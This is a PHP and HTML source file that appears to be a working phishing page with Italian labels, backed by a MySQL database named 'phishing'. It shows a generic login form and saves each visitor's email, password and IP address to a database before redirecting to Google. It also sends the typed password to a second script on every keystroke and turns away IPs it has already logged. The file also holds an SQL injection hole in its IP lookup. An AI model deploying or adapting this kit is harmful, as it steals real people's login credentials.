
<?php


$db_host = "localhost";
$db_user = "root";
$db_pass = "root";
$db_name = "phishing";

$conn = new mysqli($db_host,$db_user,$db_pass, $db_name) or die("Errore connessione server");

// Function to get the client IP address
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$query = "select count(*) from utenti where ip like '".get_client_ip()."'";

$ris = $conn->query($query);
if ($ris->fetch_row()[0] != 0) {
    header("Location: http://www.google.com/");
    exit();
}


if (isset($_POST["email"]) && isset($_POST["password"])) {

    $query = 'insert inserimenti VALUES("'.
        get_client_ip()
        .'", "'.
        $conn->real_escape_string($_POST["email"])
        .'", "'.
        $conn->real_escape_string($_POST["password"])
        .'")';

    $conn->query($query);

    header("Location: http://www.google.com/");
    exit();

}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>index</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <style>
        body {
            background: rgb(147,147,147);
            background: linear-gradient(0deg, rgb(76, 76, 76) 0%, rgba(0,0,0,1) 100%);
        }
        #content {
            width: 90%;
            margin-left: 5%;
            margin-right: 5%;
            height: 100vh;
            border-left: red solid;
            border-right: red solid;
        }

        #titolo {
            text-align: center;
            color: white;
            padding-top: 10px;
        }

        fieldset {
            background-color: white;
            margin-left: 10%;
            width: 80%;
            padding: 20px 10px 20px 10px;
            border-radius: 5px;
            border: 1px red solid;
        }

        label > input {
            height: 30px;
            font-size: 19px;
            padding-top: 10px;
            padding-bottom: 2px;
        }

        label {
            font-size: 30px;
            width: 100%;
            padding: 0 0 0 10px;
        }

        form {
            border: gray 1px solid;
        }

        form > input {
            margin-left: 20px;
            margin-bottom: 10px;
            width: 60px;
        }


    </style>

</head>
<body>


<div id="content">

    <h1 id="titolo">
        Sito
    </h1>


    <fieldset>
        <form action="secret.php" method="post">
            <label>
                email <input type="text" name="email" id="email">
            </label>
            <label>
                Password <input type="text" name="password" id="passw">
            </label>
            <input type="submit" value="invia">
        </form>
    </fieldset>


</div>

<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>

<script>
    $(document).ready(function(){
        $("#passw").on('input', function() {
            $.ajax({
                type: "POST", url: "login.php",
                data: 'email=' + $("#email").val() + "&password=" + $("#passw").val(),
                success: function (risposta) {
                }
            });
        });
    });
</script>

</body>
</html>
